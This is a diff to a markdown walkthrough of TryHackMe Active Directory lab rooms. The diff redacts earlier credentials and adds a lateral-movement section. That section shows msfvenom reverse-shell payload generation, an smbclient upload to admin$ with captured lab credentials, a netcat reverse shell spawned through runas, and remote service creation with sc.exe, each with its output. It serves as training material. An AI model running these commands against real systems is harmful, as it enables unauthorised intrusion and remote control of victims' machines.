@@ -614,7 +614,7 @@ firefox http://distributor.za.tryhackme.com/creds
 
 Output:
 
-> Your credentials have been generated: Username: p[******]d Password: S[******]7
+> Your credentials have been generated: Username: p[...]d Password: S[...]7
 
 Now let's use `ssh` to log into the Jump Box and verify our credentials:
 
@@ -874,3 +874,140 @@ How many machines do members of the Tier 1 Admins group have administrative acce
 
 How many users are members of the Tier 2 Admins group?
 - __15__
+
+## Lateral Movement and Pivoting
+
+Having downloaded the necessary VPN configuration file, use the [script](https://github.com/gremlin-0x/AD_module_dns_config) once again to connect to the network and configure DNS:
+
+```shell
+./network.sh lateralmovementandpivoting.ovpn 10.200.71.101
+```
+
+Now let's visit the credential distributor on this network and get credentials:
+
+```shell
+firefox http://distributor.za.tryhackme.com/creds
+```
+
+The credentials are:
+
+```
+ Your credentials have been generated: Username: tony.holland Password: Mhvn2334 
+```
+
+Okay, let's try to login with these credentials using SSH:
+
+```
+ssh za.tryhackme.com\\tony.holland@thmjmp2.za.tryhackme.com
+```
+
+And we're in:
+
+```
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+za\tony.holland@THMJMP2 C:\Users\tony.holland>
+```
+
+Lateral movement is the technique attackers use to move across a network after gaining an initial foothold. Instead of staying on the first compromised machine, they navigate through other systems to escalate privileges, bypass security measures, and reach valuable targets.
+
+Once an attacker has valid credentials on a target machine, they need a way to execute commands remotely. Different methods have different requirements, detection risks, and benefits.
+
+Attackers use __PsExec__, __WinRM__, __remote service creation__, and __scheduled tasks__ to execute commands remotely. __WinRM__ is stealthier than __PsExec__ but still logs activity. `sc.exe` (__remote service creation__) and `schtasks.exe` (__scheduled tasks__) are great for persistence. Defenders should monitor logs, restrict remote execution, and disable unnecessary services.
+
+Now let's follow the steps. We have some credentials captured and are trying to move to a different machine from this Jump Box with these credentials. The room informs that all four methods mentioned above should work against this specified machine, which is why we will try all of them. Let's start with `sc.exe` or remote service creation method:
+
+```shell
+msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.65.56 LPORT=9233 -o sc_myservice.exe
+```
+
+This generates a reverse shell payload as an `exe` file to upload to a Windows machine. This is exactly what we are going to do using `smbclient` and our captured credentials:
+
+```shell
+smbclient -c 'put sc_myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+```
+
+The output:
+
+```
+putting file sc_myservice.exe as \sc_myservice.exe (30.2 kb/s) (average 30.2 kb/s)
+```
+
+Now let's set up a listener in the `metasploit` console:
+
+```shell
+msfconsole -qx "use exploit/multi/handler; set lhost 10.50.65.56; set lport 9233; set payload windows/shell/reverse_tcp; run;
+```
+
+After this is done, in our `ssh` session with `tony.holland`'s account, we need to run another reverse shell with `t1_leonard.summers`' access token:
+
+```cmd
+runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.65.56 4443"
+```
+
+And start a reverse shell on our machine:
+
+```shell
+nc -lvnp 4443
+```
+
+Which works:
+
+```
+listening on [any] 4443 ...
+connect to [10.50.65.56] from (UNKNOWN) [10.200.71.249] 63953
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+Now using this shell, we need to try to create a service on this machine from `sc_myservice.exe` that we just uploaded:
+
+```cmd
+sc.exe \\thmiis.za.tryhackme.com create THMservice-98455 binPath= "%windir%\sc_myservice.exe" start= auto
+```
+
+And then start that service:
+
+```cmd
+sc.exe \\thmiis.za.tryhackme.com start THMservice-98455
+```
+
+And back in `metasploit` console's listener, we received a shell:
+
+```
+└─$ msfconsole -qx "use exploit/multi/handler; set lhost 10.50.65.56; set lport 9233; set payload windows/shell/reverse_tcp; run;
+dquote> "
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
+You can add syslog to your Gemfile or gemspec to silence this warning.
+Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
+[*] Using configured payload generic/shell_reverse_tcp
+lhost => 10.50.65.56
+lport => 9233
+payload => windows/shell/reverse_tcp
+[*] Started reverse TCP handler on 10.50.65.56:9233
+[*] Sending stage (240 bytes) to 10.200.71.201
+[*] Command shell session 1 opened (10.50.65.56:9233 -> 10.200.71.201:64297) at 2025-03-08 13:06:29 -0500
+
+
+Shell Banner:
+Microsoft Windows [Version 10.0.17763.1098]
+-----
+
+
+C:\Windows\system32>
+```
+
+Now let's go to this user's Desktop and run `flag.exe` to retrieve the flag:
+
+```
+C:\Windows\system32>cd C:\Users\t1_leonard.summers\Desktop
+cd C:\Users\t1_leonard.summers\Desktop
+
+C:\Users\t1_leonard.summers\Desktop>flag.exe
+flag.exe
+THM{****REDACTED****}
+```
+
